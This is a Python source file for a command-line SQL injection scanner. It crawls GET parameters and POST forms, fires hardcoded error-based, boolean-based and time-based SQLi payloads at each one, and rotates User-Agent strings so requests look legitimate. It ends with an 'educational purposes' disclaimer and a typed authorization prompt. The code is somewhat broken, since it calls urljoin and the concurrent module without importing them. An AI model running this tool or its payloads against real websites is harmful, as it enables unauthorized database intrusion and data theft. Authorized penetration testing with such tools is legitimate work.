import requests
import sys
import argparse
import time
import random
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlencode, parse_qs
from bs4 import BeautifulSoup # For parsing HTML to find forms - install with: pip install beautifulsoup4
from colorama import Fore, Style, init

# Initialize Colorama for colored output
init(autoreset=True)

# List of common User-Agents for rotation to make requests appear more legitimate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
]

# Common SQL Injection payloads for various databases
SQL_PAYLOADS = {
    "Error-Based": [
        "' OR 1=1 -- -",
        "\" OR 1=1 -- -",
        "' AND 1=1 -- -",
        "\" AND 1=1 -- -",
        "' ORDER BY 1-- -",
        "\" ORDER BY 1-- -",
        "information_schema", # Common database name
        "union select null,null,null -- -", # Basic UNION SELECT
        "admin' or '1'='1",
        "foo' or '1'='1",
        "\" or 1=1--",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1"
    ],
    "Boolean-Based": [
        " AND 1=2-- -",  # Should return false
        " AND 1=1-- -"   # Should return true
    ],
    "Time-Based": [
        " OR SLEEP(5)-- -",
        "\" OR SLEEP(5)-- -",
        "' AND SLEEP(5)-- -",
        "\" AND SLEEP(5)-- -",
        "1 AND SLEEP(5)",
        "1' AND SLEEP(5)-- -",
        "1\" AND SLEEP(5)-- -",
    ]
}

# Common database error messages to look for in responses
SQL_ERROR_MESSAGES = [
    "sql syntax", "syntax error", "mysql_fetch_array()", "mysql_num_rows()",
    "input string was not in a correct format", "quoted string not properly terminated",
    "unclosed quotation mark", "Microsoft JET Database Engine", "ODBC Text Driver",
    "Error converting data type", "Invalid column name", "Unclosed quotation mark",
    "DB2 SQL Error", "Oracle error", "PostgreSQL error", "ORA-", "SQLSTATE",
    "java.sql.SQLException", "SqlException", "System.Data.SqlClient.SqlException",
    "Warning: mysql_", "Warning: pg_", "Warning: oci_"
]

def get_random_user_agent():
    """Returns a random User-Agent string."""
    return random.choice(USER_AGENTS)

def print_banner():
    """Prints a professional ASCII art banner for the SQLi scanner."""
    banner = f"""
{Fore.MAGENTA}{Style.BRIGHT}
█▀ █▀█ █░░   █ █▄░█ ░░█ █▀▀ █▀▀ ▀█▀ █ █▀█ █▄░█
▄█ ▀▀█ █▄▄   █ █░▀█ █▄█ ██▄ █▄▄ ░█░ █ █▄█ █░▀█
                                         SQL Injection Scanner V1.0
      
---------------------------------------------------
{Style.RESET_ALL}
"""
    print(banner)

def make_request(url, method='GET', data=None, params=None, timeout=10):
    """
    Helper function to make HTTP requests with random User-Agent.
    Returns the response object or None on error.
    """
    headers = {'User-Agent': get_random_user_agent()}
    try:
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=data, timeout=timeout)
        else: # Default to GET
            response = requests.get(url, headers=headers, params=params, timeout=timeout)
        return response
    except requests.exceptions.RequestException as e:
        # print(f"{Fore.RED}    [ERROR] Request to {url} failed: {e}{Style.RESET_ALL}")
        return None

def extract_forms(html_content, target_url):
    """
    Extracts all forms from HTML content and returns a list of dictionaries,
    each representing a form's action, method, and input fields.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []
    for form_tag in soup.find_all('form'):
        form_action = form_tag.get('action') or target_url
        form_method = form_tag.get('method', 'GET').upper()
        
        # Resolve relative URLs
        if not urlparse(form_action).netloc:
            form_action = urljoin(target_url, form_action)

        inputs = {}
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text') # default to text if type is not specified
            
            if input_name:
                inputs[input_name] = input_value
        
        forms.append({'action': form_action, 'method': form_method, 'inputs': inputs})
    return forms

def check_for_sql_errors(response_text):
    """Checks if the response text contains common SQL error messages."""
    for error_msg in SQL_ERROR_MESSAGES:
        if error_msg.lower() in response_text.lower():
            return error_msg
    return None

def scan_parameter(base_url, param_name, original_value, method, original_data, original_params, default_timeout=10):
    """
    Scans a single parameter for SQL Injection vulnerabilities.
    Returns True if vulnerable, False otherwise.
    """
    
    # 1. Get baseline response (for boolean-based and time-based comparison)
    baseline_response = make_request(
        base_url,
        method=method,
        data=original_data,
        params=original_params,
        timeout=default_timeout
    )
    if not baseline_response:
        return False, f"Could not get baseline for {param_name}"

    baseline_len = len(baseline_response.content)
    baseline_time = baseline_response.elapsed.total_seconds()
    
    print(f"{Fore.CYAN}    [+] Testing parameter '{param_name}' ({method}) with payloads...{Style.RESET_ALL}")

    # Test Error-Based Payloads
    for payload in SQL_PAYLOADS["Error-Based"]:
        modified_value = original_value + payload
        
        if method.upper() == 'GET':
            test_params = original_params.copy()
            test_params[param_name] = modified_value
            response = make_request(base_url, method='GET', params=test_params, timeout=default_timeout)
        else: # POST
            test_data = original_data.copy()
            test_data[param_name] = modified_value
            response = make_request(base_url, method='POST', data=test_data, timeout=default_timeout)
        
        if response:
            error_found = check_for_sql_errors(response.text)
            if error_found:
                print(f"{Fore.RED}{Style.BRIGHT}        [!!! VULNERABLE - Error-Based !!!]{Style.RESET_ALL}")
                print(f"{Fore.RED}            Payload: '{payload}'{Style.RESET_ALL}")
                print(f"{Fore.RED}            Error: '{error_found}' found in response.{Style.RESET_ALL}")
                return True, f"Error-Based SQLi found with payload: '{payload}' (Error: '{error_found}')"
        sys.stdout.write(f"\r        [*] Testing Error-Based for '{param_name}' with payload: '{payload[:30]}...' ")
        sys.stdout.flush()

    # Test Boolean-Based Payloads
    # We will use 1=1 and 1=2 and compare response lengths/content for significant differences
    for payload_true, payload_false in [(SQL_PAYLOADS["Boolean-Based"][1], SQL_PAYLOADS["Boolean-Based"][0])]:
        # Test 1=1 (should often yield similar to baseline or slight change)
        modified_value_true = original_value + payload_true
        if method.upper() == 'GET':
            test_params_true = original_params.copy()
            test_params_true[param_name] = modified_value_true
            response_true = make_request(base_url, method='GET', params=test_params_true, timeout=default_timeout)
        else:
            test_data_true = original_data.copy()
            test_data_true[param_name] = modified_value_true
            response_true = make_request(base_url, method='POST', data=test_data_true, timeout=default_timeout)

        # Test 1=2 (should often yield different from baseline/1=1 if vulnerable)
        modified_value_false = original_value + payload_false
        if method.upper() == 'GET':
            test_params_false = original_params.copy()
            test_params_false[param_name] = modified_value_false
            response_false = make_request(base_url, method='GET', params=test_params_false, timeout=default_timeout)
        else:
            test_data_false = original_data.copy()
            test_data_false[param_name] = modified_value_false
            response_false = make_request(base_url, method='POST', data=test_data_false, timeout=default_timeout)

        if response_true and response_false:
            len_true = len(response_true.content)
            len_false = len(response_false.content)
            
            # If response lengths differ significantly between TRUE and FALSE conditions
            if abs(len_true - len_false) > (baseline_len * 0.1): # 10% difference threshold
                print(f"\n{Fore.RED}{Style.BRIGHT}        [!!! VULNERABLE - Boolean-Based !!!]{Style.RESET_ALL}")
                print(f"{Fore.RED}            Payloads: '{payload_true}' (len={len_true}), '{payload_false}' (len={len_false}){Style.RESET_ALL}")
                print(f"{Fore.RED}            Response lengths differ significantly.{Style.RESET_ALL}")
                return True, f"Boolean-Based SQLi found with payloads: '{payload_true}' and '{payload_false}'"
        sys.stdout.write(f"\r        [*] Testing Boolean-Based for '{param_name}'")
        sys.stdout.flush()


    # Test Time-Based Payloads (Blind SQLi)
    # This requires comparing response times.
    for payload in SQL_PAYLOADS["Time-Based"]:
        modified_value = original_value + payload
        
        if method.upper() == 'GET':
            test_params = original_params.copy()
            test_params[param_name] = modified_value
            start_payload_time = time.time()
            response = make_request(base_url, method='GET', params=test_params, timeout=default_timeout + 6) # Increased timeout
            end_payload_time = time.time()
        else: # POST
            test_data = original_data.copy()
            test_data[param_name] = modified_value
            start_payload_time = time.time()
            response = make_request(base_url, method='POST', data=test_data, timeout=default_timeout + 6) # Increased timeout
            end_payload_time = time.time()
        
        if response:
            time_diff = end_payload_time - start_payload_time
            # If the response time is significantly longer than baseline (e.g., 4 seconds more than baseline + 5s sleep)
            # A threshold of 4 seconds is added to baseline to account for network latency and server processing.
            if time_diff > (baseline_time + 4): 
                print(f"\n{Fore.RED}{Style.BRIGHT}        [!!! VULNERABLE - Time-Based (Blind) !!!]{Style.RESET_ALL}")
                print(f"{Fore.RED}            Payload: '{payload}'{Style.RESET_ALL}")
                print(f"{Fore.RED}            Response took {time_diff:.2f}s (Baseline: {baseline_time:.2f}s){Style.RESET_ALL}")
                return True, f"Time-Based SQLi found with payload: '{payload}' (Delay: {time_diff:.2f}s)"
        sys.stdout.write(f"\r        [*] Testing Time-Based for '{param_name}' with payload: '{payload[:30]}...' ")
        sys.stdout.flush()

    print(f"\r        {Fore.GREEN}[-] Parameter '{param_name}' seems NOT vulnerable to basic SQLi payloads.{Style.RESET_ALL}")
    return False, "Not vulnerable to basic SQLi"


def sql_injection_scanner(target_url, http_method='GET', payloads_file=None, num_workers=5):
    """
    Main function to orchestrate the SQL Injection scan.
    """
    vulnerabilities_found = []
    
    print(f"\n{Fore.BLUE}[+] Starting SQL Injection Scan for {target_url} ({http_method})...{Style.RESET_ALL}")

    # For GET requests, parse URL parameters
    if http_method.upper() == 'GET':
        parsed_url = urlparse(target_url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            print(f"{Fore.YELLOW}    No GET parameters found in the URL. Skipping GET scan.{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.BLUE}    [+] Identified GET parameters: {', '.join(query_params.keys())}{Style.RESET_ALL}")

        param_tuples = [(name, values[0]) for name, values in query_params.items()] # Assume single value for now
        
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            futures = []
            for param_name, original_value in param_tuples:
                # Create original_params for each run
                current_params = query_params.copy()
                # Remove query string from base_url to add parameters later
                base_url_no_query = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
                
                futures.append(executor.submit(
                    scan_parameter,
                    base_url_no_query,
                    param_name,
                    original_value,
                    'GET',
                    None, # No data for GET
                    current_params
                ))
            
            for future in concurrent.futures.as_completed(futures):
                is_vuln, details = future.result()
                if is_vuln:
                    vulnerabilities_found.append(f"GET parameter '{param_name}' on {base_url_no_query}: {details}")

    # For POST requests, fetch the page to find forms
    elif http_method.upper() == 'POST':
        print(f"{Fore.BLUE}    [+] Fetching page to identify POST forms...{Style.RESET_ALL}")
        response = make_request(target_url, method='GET') # Fetch page to get forms
        if not response:
            print(f"{Fore.RED}    Error: Could not fetch target URL to find forms.{Style.RESET_ALL}")
            return []
        
        forms = extract_forms(response.text, target_url)
        if not forms:
            print(f"{Fore.YELLOW}    No POST forms found on {target_url}. Skipping POST scan.{Style.RESET_ALL}")
            return []

        for form in forms:
            if form['method'].upper() == 'POST':
                form_action = form['action']
                form_inputs = form['inputs']
                print(f"{Fore.BLUE}    [+] Identified POST form at '{form_action}' with parameters: {', '.join(form_inputs.keys())}{Style.RESET_ALL}")

                if not form_inputs:
                    print(f"{Fore.YELLOW}        Form has no input parameters. Skipping.{Style.RESET_ALL}")
                    continue

                param_tuples = [(name, value) for name, value in form_inputs.items()]

                with ThreadPoolExecutor(max_workers=num_workers) as executor:
                    futures = []
                    for param_name, original_value in param_tuples:
                        # Create original_data for each run
                        current_data = form_inputs.copy()
                        
                        futures.append(executor.submit(
                            scan_parameter,
                            form_action,
                            param_name,
                            original_value,
                            'POST',
                            current_data,
                            None # No params for POST
                        ))
                    
                    for future in concurrent.futures.as_completed(futures):
                        is_vuln, details = future.result()
                        if is_vuln:
                            vulnerabilities_found.append(f"POST parameter '{param_name}' in form on {form_action}: {details}")
            else:
                print(f"{Fore.YELLOW}    [WARNING] Form at '{form['action']}' is a GET form, not POST. Skipping.{Style.RESET_ALL}")

    print(f"\n{Fore.BLUE}--- SQL Injection Scan Complete ---{Style.RESET_ALL}")
    if vulnerabilities_found:
        print(f"{Fore.RED}{Style.BRIGHT}!!! Found {len(vulnerabilities_found)} Potential SQL Injection Vulnerabilities !!!{Style.RESET_ALL}")
        for vuln in vulnerabilities_found:
            print(f"{Fore.RED}    - {vuln}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}No obvious SQL Injection vulnerabilities found with basic payloads.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Note: This does not guarantee full immunity. Advanced payloads may still exist.{Style.RESET_ALL}")
    
    print(f"{Fore.RED}Remember: This tool is for educational purposes only. Unauthorized scanning is illegal and unethical.{Style.RESET_ALL}")
    
    return vulnerabilities_found

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="SQL Injection Scanner - For Website Vulnerability Testing.")
    parser.add_argument("target_url", help="The target URL to scan (e.g., http://example.com/search.php?query=test or http://example.com/login.php for POST forms).")
    parser.add_argument("-m", "--method", type=str, default="GET", choices=["GET", "POST"],
                        help="HTTP method to use for scanning parameters (GET or POST, default: GET). For POST, the URL should be the form action URL.")
    parser.add_argument("-w", "--workers", type=int, default=5,
                        help="Number of concurrent workers (threads) for scanning parameters (default: 5).")
    # Custom payloads feature can be added here if needed, but for now, using hardcoded ones.
    # parser.add_argument("-p", "--payloads_file", type=str, help="Path to a file containing custom SQLi payloads (one per line).")

    args = parser.parse_args()

    # Basic URL validation
    parsed_url = urlparse(args.target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"{Fore.RED}Error: Invalid target URL. Please provide a full URL (e.g., http://example.com/page.php?id=1).{Style.RESET_ALL}")
        sys.exit(1)

    # Final confirmation before launching the scan
    print(f"\n{Fore.YELLOW}!!! WARNING: You are about to launch an SQL Injection scan on {args.target_url} !!!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This can potentially expose sensitive data or disrupt your website if vulnerable.{Style.RESET_ALL}")
    confirmation = input(f"{Fore.YELLOW}Type 'YES' to confirm you understand the risks and have proper authorization: {Style.RESET_ALL}")

    if confirmation.upper() == 'YES':
        sql_injection_scanner(args.target_url, args.method, num_workers=args.workers)
    else:
        print(f"{Fore.RED}Scan aborted. Please confirm by typing 'YES' if you wish to proceed.{Style.RESET_ALL}")
        sys.exit(0)
